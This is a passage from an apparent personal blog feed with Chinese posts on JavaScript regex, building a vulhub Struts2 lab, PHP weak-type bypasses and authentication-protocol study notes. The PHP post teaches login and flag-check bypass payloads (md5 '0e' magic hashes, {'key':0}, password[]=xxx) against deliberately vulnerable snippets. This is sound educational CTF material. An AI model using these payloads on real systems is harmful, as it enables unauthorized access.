<p><code>[abc]</code>:查找方括号之间的任何字符<br>  <code>[^abc]</code>:查找任何不在方括号之间的字符<br>  <code>[0-9]</code>:查找任何从0至9的数字<br>  <code>[a-z]</code>:查找任何从小写a到小写z的字符<br>  <code>[A-Z]</code>:查找任何从大写A到大写Z的字符<br>  <code>[A-z]</code>:查找任何从大写A到小写z的字符<br>  <code>(red|blue|green)</code>:查找任何指定的选项</p>
</blockquote>
<h3 id="正则表达式量词"><a href="#正则表达式量词" class="headerlink" title="正则表达式量词"></a>正则表达式量词</h3><blockquote>
<p>n+ :匹配任何包含至少一个n的字符串<br>n* :匹配任何包含零个或多个n的字符串<br>n? :匹配任何包含零个或一个n的字符串<br>n{X} :匹配包含X个n的序列的字符串<br>n{X,Y} :匹配包含X至Y个n的序列的字符串<br>n{X,} :匹配任何包含至少X个n的序列的字符串<br>n$ :匹配任何结尾为n的字符串<br>^n :匹配任何开头为n的字符串</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;hello&quot;;</span><br><span class="line">var reg&#x3D;&#x2F;e+&#x2F;;</span><br><span class="line">alert(reg.test(str)); &#x2F;&#x2F;true</span><br><span class="line"></span><br><span class="line">var str&#x3D;&quot;aaabbbcd&quot;</span><br><span class="line">var reg&#x3D;&#x2F;a&#123;2,5&#125;&#x2F;;</span><br><span class="line">alert(reg.text(str)); &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h3><blockquote>
<p>i:执行对大小写不敏感的匹配<br>g:执行全局匹配(查找所有匹配而非在找到第一个匹配后停止)<br>m:执行多行匹配</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;BBS&quot;</span><br><span class="line">var reg&#x3D;&#x2F;b&#x2F;i</span><br><span class="line">alert(reg.test(str)) &#x2F;&#x2F;true</span><br><span class="line"></span><br><span class="line">var str&#x3D;&quot;basfbgrf&quot;</span><br><span class="line">var reg&#x3D;&#x2F;b&#x2F;g;</span><br><span class="line">alert(reg.test(str)) &#x2F;&#x2F;ture</span><br><span class="line">alert(reg.test(str)) &#x2F;&#x2F;true</span><br><span class="line">alert(reg.test(str)) &#x2F;&#x2F;flase</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>linux漏洞复现的艰辛过程</title>
    <url>/2018/09/13/linux%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E8%89%B0%E8%BE%9B%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="ubuntu17-04源"><a href="#ubuntu17-04源" class="headerlink" title="ubuntu17.04源"></a>ubuntu17.04源</h2><p>前段时间，想要复现struck2漏洞，本来用的好好的ubuntu虚拟机，突然就出现了源问题，<br>尝试各种换源，更新源都以失败告终，最后查到，好多源地址都取消了对ubuntu17的支持，<br>就在我要放弃他，重装ubuntu18时，找到了一个清华源还是对ubuntu17支持的…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial main restricted</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-updates main restricted</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial universe</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-updates universe</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-updates multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-security main restricted</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-security universe deb</span><br></pre></td></tr></table></figure>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>漏洞来自于：<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p>
<p>我们将vulhub下载下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub</span><br><span class="line">cd vulhub&#x2F;struts2&#x2F;s2-048</span><br></pre></td></tr></table></figure>
<p>启动环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">这里需要docker-compose</span><br><span class="line">如果未安装，则执行</span><br><span class="line">sudo apt install docker-compose</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">当我们执行docker-compose up -d，可能会遇到这种问题，</span><br><span class="line">ERROR: Couldn&#39;t connect to Docker daemon at http+docker:&#x2F;&#x2F;localunixsocket - is it running?</span><br><span class="line"></span><br><span class="line">If it&#39;s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</span><br><span class="line"></span><br><span class="line">我们将用户加入docker组即可.</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo su</span><br><span class="line">su 用户名</span><br></pre></td></tr></table></figure>
<h3 id="ubuntu代理配置"><a href="#ubuntu代理配置" class="headerlink" title="ubuntu代理配置"></a>ubuntu代理配置</h3><p>这里执行之后环境一直pull不下来，百度了一下，发现原来需要fq，这里我们配置一下，<br>实现本机挂上vps，虚拟机ubuntu获取代理，实现fq。</p>
<p>首先我们配置虚拟机NET模式<br><img src="/uploads/stu1.png" alt="1"></p>
<p>然后我们获取本机的ip地址，打开ubuntu网络设置，进行手动代理配置，代理地址全部填写本机ip地址，端口为1080，因为1080开启的是socks服务.<br>本机的shadowsocks开启允许来自局域网的连接.然后启动系统代理就可以使用了。<br><img src="/uploads/stu2.jpg" alt="1"></p>
<h3 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h3><p><code>docker ps -a</code>查看启动的容器<br><img src="/uploads/stu3.png" alt="1"></p>
<p>本地访问8080端口，环境搭建成功！<br><img src="/uploads/stu4.png" alt="1"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>php弱类型总结</title>
    <url>/2018/03/15/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="php弱类型总结"><a href="#php弱类型总结" class="headerlink" title="php弱类型总结"></a>php弱类型总结</h1><h2 id="符号比较"><a href="#符号比较" class="headerlink" title="符号比较"></a>符号比较</h2><blockquote>
<p>php中有两种比较符号==和===</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $a &#x3D; $b ;</span><br><span class="line"> $a&#x3D;&#x3D;&#x3D;$b ;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>===在比较时，会先判断这两种字符串的类型是否相等，再比较。<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较。<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;admin&quot;&#x3D;&#x3D;0);  &#x2F;&#x2F;true</span><br><span class="line">var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true</span><br><span class="line">var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false</span><br><span class="line">var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.观察上述代码，”admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等<br>2 “1admin”==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是”admin1”被转化成了0<br>3 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等<br>总结：当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test&#x3D;1 + &quot;10.5&quot;; &#x2F;&#x2F; $test&#x3D;11.5(float)</span><br><span class="line">$test&#x3D;1+&quot;-1.3e3&quot;; &#x2F;&#x2F;$test&#x3D;-1299(float)</span><br><span class="line">$test&#x3D;1+&quot;bob-1.3e3&quot;;&#x2F;&#x2F;$test&#x3D;1(int)</span><br><span class="line">$test&#x3D;1+&quot;2admin&quot;;&#x2F;&#x2F;$test&#x3D;3(int)</span><br><span class="line">$test&#x3D;1+&quot;admin2&quot;;&#x2F;&#x2F;$test&#x3D;1(int)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#39;Username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    $logined &#x3D; true;</span><br><span class="line">    $Username &#x3D; $_GET[&#39;Username&#39;];</span><br><span class="line">    $password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line"></span><br><span class="line">     if (!ctype_alpha($Username)) &#123;$logined &#x3D; false;&#125;</span><br><span class="line">     if (!is_numeric($password) ) &#123;$logined &#x3D; false;&#125;</span><br><span class="line">     if (md5($Username) !&#x3D; md5($password)) &#123;$logined &#x3D; false;&#125;</span><br><span class="line">     if ($logined)&#123;</span><br><span class="line">    echo &quot;successful&quot;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">           echo &quot;login failed!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上代码表达的意思是输入的字符串和数字类型，并且他们对应的md5值相等，才会执行下一步语句。<br>而有些字符串的md5值是0e开头的，这就利用了php的弱类型，0e比较时会被认为是科学计数法，所以0e后面是任何字符都会相等。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
<h3 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#39;message&#39;])) &#123;</span><br><span class="line">    $message &#x3D; json_decode($_POST[&#39;message&#39;]);</span><br><span class="line">    $key &#x3D;&quot;*********&quot;;</span><br><span class="line">    if ($message-&gt;key &#x3D;&#x3D; $key) &#123;</span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过<br>最终payload message={“key”:0}</p>
</blockquote>
<h3 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!is_array($_GET[&#39;test&#39;]))&#123;exit();&#125;</span><br><span class="line">$test&#x3D;$_GET[&#39;test&#39;];</span><br><span class="line">for($i&#x3D;0;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    if($test[$i]&#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;</span><br><span class="line">        echo &quot;error&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]&#x3D;intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line">if(array_search(&quot;admin&quot;,$test)&#x3D;&#x3D;&#x3D;0)&#123;</span><br><span class="line">    echo &quot;flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;false&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag<br>payload test[]=0可以绕过</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_search介绍:</span><br><span class="line"></span><br><span class="line">mixed array_search ( mixed $needle , array $haystack [, bool $strict &#x3D; false ] )</span><br><span class="line"></span><br><span class="line">$needle，$haystack必需，$strict可选  函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(0,1);</span><br><span class="line">var_dump(array_search(&quot;admin&quot;,$a)); &#x2F;&#x2F; int(0) &#x3D;&gt; 返回键值0</span><br><span class="line">var_dump(array_seach(&quot;1admin&quot;,$a));  &#x2F;&#x2F; int(1) &#x3D;&#x3D;&gt;返回键值1</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">array_search函数 类似于&#x3D;&#x3D; 也就是$a&#x3D;&#x3D;&quot;admin&quot; 当然是$a&#x3D;0  当然如果第三个参数为true则就不能绕过</span><br></pre></td></tr></table></figure>
<h3 id="strcmp漏洞绕过"><a href="#strcmp漏洞绕过" class="headerlink" title="strcmp漏洞绕过"></a>strcmp漏洞绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $password&#x3D;&quot;***************&quot;</span><br><span class="line">     if(isset($_POST[&#39;password&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">        if (strcmp($_POST[&#39;password&#39;], $password) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            echo &quot;Right!!!login success&quot;;n</span><br><span class="line">            exit();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Wrong password..&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0.<br>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢.<br>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等.<br>payload: password[]=xxx</p>
</blockquote>
<h3 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;&quot;4admin&quot;;</span><br><span class="line">switch ($a) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">        echo &quot;fail1&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 2:</span><br><span class="line">        echo &quot;fail2&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        echo &quot;fail3&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 4:</span><br><span class="line">        echo &quot;sucess&quot;;  &#x2F;&#x2F;结果输出success;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        echo &quot;failall&quot;;</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>“4admin”==4</p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>My first blog</title>
    <url>/2018/02/07/my%20first%20blog/</url>
    <content><![CDATA[<p>你好，这是我的第一篇博客，内心有点小激动，第一次创建个人博客，我以后也一定多多更新博客，继续加油！！！</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>first</tag>
      </tags>
  </entry>
  <entry>
    <title>Authentication protocols</title>
    <url>/2018/07/04/protocols/</url>
    <content><![CDATA[<p>又到了学期末啦！时间过得好快，进入了考试周，近期会将复习内容总结到博客上，今天的主题的安全协议.<br>因为是双语课，教材是纯英文的，所以我会以英汉双语的形式总结知识点.</p>
<h1 id="Authentication-protocols-认证协议"><a href="#Authentication-protocols-认证协议" class="headerlink" title="Authentication protocols(认证协议)"></a>Authentication protocols(认证协议)</h1><h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice必须向Bob证明自己的身份，同时也可以要求Bob证明自己的身份(相互认证).</span><br><span class="line">可能需要建立会话密钥，也有其他要求，如使用公钥、使用对称密钥、使用哈希函数.</span><br><span class="line"></span><br><span class="line">Alice must prove her identity to Bob</span><br><span class="line">	Alice and Bob can be humans or computers</span><br><span class="line"></span><br><span class="line">May also require Bob to prove he’s Bob (mutual authentication)</span><br><span class="line"></span><br><span class="line">May also need to establish a session key</span><br><span class="line"></span><br><span class="line">May have other requirements, such as</span><br><span class="line">    Use only public keys</span><br><span class="line">    Use only symmetric keys</span><br><span class="line">    Use only a hash function</span><br><span class="line">    Anonymity, plausible deniability, etc., etc.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">独立计算机上的身份验证相对简单，“安全路径”是主要问题，主要担心的是对身份验证软件的攻击.</span><br><span class="line">通过网络进行身份验证要复杂得多,攻击者可以被动地观察消息,攻击者可以重播消息,可能存在主动攻击（插入，删除，更改消息）</span><br><span class="line"></span><br><span class="line">Authentication on a stand-alone computer is relatively simple</span><br><span class="line">	“Secure path” is the primary issue</span><br><span class="line">	Main concern is an attack on authentication software</span><br><span class="line"></span><br><span class="line">Authentication over a network is much more complex</span><br><span class="line">	Attacker can passively observe messages</span><br><span class="line">	Attacker can replay messages</span><br><span class="line">	Active attacks may be possible (insert, delete, change messages)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Simple-Authentication"><a href="#Simple-Authentication" class="headerlink" title="Simple Authentication"></a>Simple Authentication</h2><p>Alice向Bob发送“I’m Alice”，Bob要求Alice证明其身份，Alice发送给Bob自己的密码，Bob验证是否正确.</p>
<p>该认证，对于独立系统可能没问题，但是网络系统下会有很大的问题，会受到重放攻击.</p>
<h2 id="Challenge-Response"><a href="#Challenge-Response" class="headerlink" title="Challenge-Response"></a>Challenge-Response</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice向Bob发送“I’m Alice”，Bob向Alice发送一个挑战Nonce，Alice发送给Bob h(Alice’s password, Nonce)，Bob验证是否正确.</span><br><span class="line"></span><br><span class="line">Nonce is the challenge</span><br><span class="line">The hash is the response</span><br><span class="line">Nonce prevents replay, insures freshness</span><br><span class="line">Password is something Alice knows</span><br><span class="line">Note that Bob must know Alice’s password</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Protocol-Architectures-协议架构"><a href="#Protocol-Architectures-协议架构" class="headerlink" title="Protocol Architectures(协议架构)"></a>Protocol Architectures(协议架构)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Existing Cryptographic Keys(现有的加密密钥)</span><br><span class="line">Method of Session Key Generation(会话密钥生成方法)</span><br><span class="line">Number of Entities(实体数量)</span><br></pre></td></tr></table></figure>
<h3 id="Existing-Cryptographic-Keys"><a href="#Existing-Cryptographic-Keys" class="headerlink" title="Existing Cryptographic Keys"></a>Existing Cryptographic Keys</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实体已共享可用于加密操作的密钥</span><br><span class="line">在主体拥有经认证的公钥的情况下使用离线服务器。</span><br><span class="line">使用在线服务器（即，每个主体与可信服务器共享密钥）。</span><br><span class="line"></span><br><span class="line">The entities already share a secret key that can be used for cryptographic operations</span><br><span class="line"></span><br><span class="line">An off-line server is used where the principals possess certified public keys.</span><br><span class="line"></span><br><span class="line">An on-line server is used (i.e., each principal shares a key with a trusted server).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Method-of-Session-Key-Generation"><a href="#Method-of-Session-Key-Generation" class="headerlink" title="Method of Session Key Generation"></a>Method of Session Key Generation</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密钥传输协议：一个用户创建或获取秘密值并将其安全地传输给其他用户</span><br><span class="line">密钥协商协议：会话密钥是所有协议用户输入的函数。</span><br><span class="line">混合协议：会话密钥是多个主体的输入函数，但不是所有用户的输入函数。</span><br><span class="line"></span><br><span class="line">Key Transport Protocol: one user creates or obtains a secret value and securely transfers it to the other users</span><br><span class="line"></span><br><span class="line">Key Agreement Protocol: the session key is a function of inputs by all protocol users.</span><br><span class="line"></span><br><span class="line">Hybrid Protocol: the session key is a function of inputs by more than one principal, but not by all users.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Number-of-Entities"><a href="#Number-of-Entities" class="headerlink" title="Number of Entities"></a>Number of Entities</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">双方密钥建立协议</span><br><span class="line">三方（三方）密钥建立协议</span><br><span class="line">基于组的协议（会议密钥协议）</span><br><span class="line"></span><br><span class="line">two-party key establishment protocol</span><br><span class="line"></span><br><span class="line">three-party (tripartite) key establishment protocol</span><br><span class="line"></span><br><span class="line">group-based protocol (conference key agreement protocol)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Protocol-Goals"><a href="#Protocol-Goals" class="headerlink" title="Protocol Goals"></a>Protocol Goals</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐式密钥认证: 一方确保除了特定标识的第二方（可能还有其他已识别的可信方）之外的任何其他方都不能访问特定密钥的属性。</span><br><span class="line">密钥确认: 一方确保第二方（可能是未确认的）方实际拥有特定密钥的财产。</span><br><span class="line">显式密钥验证: 隐式密钥身份验证和密钥确认都保持时获得的属性。</span><br><span class="line">经认证的密钥建立协议：经认证的密钥建立协议是提供隐式密钥认证的密钥建立协议。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Implicit Key Authentication: The property whereby one party is assured that no other party aside from a specifically identified second party (and possibly additional identified trusted parties) may gain access to a particular secret key.</span><br><span class="line"></span><br><span class="line">Key Confirmation: The property whereby one party is assured that a second (possibly unidentified) party actually has possession of a particular secret key.</span><br><span class="line"></span><br><span class="line">Explicit Key Authentication: The property obtained when both implicit key authentication and key confirmation hold.</span><br><span class="line"></span><br><span class="line">Authenticated Key Establishment Protocol : An authenticated key establishment protocol is a key establishment protocol which provides implicit key authentication.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Additional-Security-Attributes-其他安全属性"><a href="#Additional-Security-Attributes-其他安全属性" class="headerlink" title="Additional Security Attributes(其他安全属性)"></a>Additional Security Attributes(其他安全属性)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">已知（会话）密钥安全性：协议运行应该产生唯一的秘密会话密钥。 如果此密钥被泄露，它应该对其他会话密钥没有影响。</span><br><span class="line">正向保密：即使长期私钥被泄露，也不应对先前建立的会话密钥的保密性产生任何影响。</span><br><span class="line">密钥妥协假冒抵抗：如果实体A的长期私钥被泄露，攻击者就可以冒充A.但这不应该让他冒充其他实体来攻击A.</span><br><span class="line">未知密钥共享安全性：如果实体A想要使用B创建密钥，则不应该欺骗A与实体C共享密钥。</span><br><span class="line">密钥控制：两个实体都不能强制将会话密钥强制为他选择的值。</span><br><span class="line">密钥完整性：密钥完整性是密钥未被对手修改的属性，或等效地仅具有来自合法主体的输入。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Known (Session) Key Security:A protocol run should result in a unique secret session key. If this key is compromised, it should have no impact on other session keys.</span><br><span class="line"></span><br><span class="line">Forward Secrecy: Even if long-term private keys are compromised, it should not have any effect on the secrecy of previously established session keys. </span><br><span class="line"></span><br><span class="line">Key Compromise Impersonation Resistance: If entity A&#39;s long-term private key are compromised, an adversary is able to impersonate A. But this should not enable him to impersonate other entities to A. </span><br><span class="line"></span><br><span class="line">Unknown Key Share Security: If entity A wants to create a secret key with B, it should not be possible that A is tricked into sharing a key with entity C. </span><br><span class="line"></span><br><span class="line">Key Control: Neither of the entities should be able to force the session key to a value of his choice. </span><br><span class="line"></span><br><span class="line">Key Integrity: Key integrity is the property that the key has not been modified by the adversary, or equivalently only has inputs from legitimate principals.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Key-Exchange-with-Symmetric-Cryptography-密码交换与对称密码学"><a href="#Key-Exchange-with-Symmetric-Cryptography-密码交换与对称密码学" class="headerlink" title="Key Exchange with Symmetric Cryptography (密码交换与对称密码学)"></a>Key Exchange with Symmetric Cryptography (密码交换与对称密码学)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">会话密钥: 一个特定通信会话的单独密钥</span><br><span class="line">假设Alice和Bob与KDC（Trent）共享一个秘密密钥</span><br><span class="line">协议:</span><br><span class="line">Alice要求Trent提供与Bob通信的会话密钥</span><br><span class="line">Trent生成随机会话密钥并加密随机会话密钥的两个副本，一个使用Alice的密钥，另一个使用Bob的密钥。 Trent将这两份副本发送给Alice。</span><br><span class="line">Alice解密她的会话密钥副本，并向Bob发送他的会话密钥副本</span><br><span class="line">Bob解密他的会话密钥副本</span><br><span class="line"></span><br><span class="line">Session key</span><br><span class="line">	A separate key for one particular communication session</span><br><span class="line"></span><br><span class="line">Assume Alice and Bob share a secret key with KDC (Trent)</span><br><span class="line"></span><br><span class="line">Protocol</span><br><span class="line">	Alice asks Trent for a session key to communicate with Bob</span><br><span class="line">	Trent generates a random session key and encrypts two copies of the a random session key, one with Alice’s key 	and the other with Bob’s key. Trent sends both copies to Alice.</span><br><span class="line">	Alice decrypts her copy of the session key and sends Bob his copy of the session key</span><br><span class="line">	Bob decrypts his copy of the session key</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Key-Exchange-with-Public-Key-Cryptography-密钥交换与公钥密码学"><a href="#Key-Exchange-with-Public-Key-Cryptography-密钥交换与公钥密码学" class="headerlink" title="Key Exchange with Public-Key Cryptography(密钥交换与公钥密码学)"></a>Key Exchange with Public-Key Cryptography(密钥交换与公钥密码学)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice从KDC获得Bob的公钥</span><br><span class="line">Alice生成随机会话密钥，使用Bob的公钥对其进行加密并将其发送给Bob</span><br><span class="line">Bob然后使用他的私钥解密Alice的消息</span><br><span class="line"></span><br><span class="line">Alice gets Bob’s public key from the KDC</span><br><span class="line"></span><br><span class="line">Alice generates a random session key, encrypts it using Bob’s public key and sends it to Bob</span><br><span class="line"></span><br><span class="line">Bob then decrypts Alice’s message using his private key</span><br><span class="line"></span><br></pre></td></tr></table></figure>
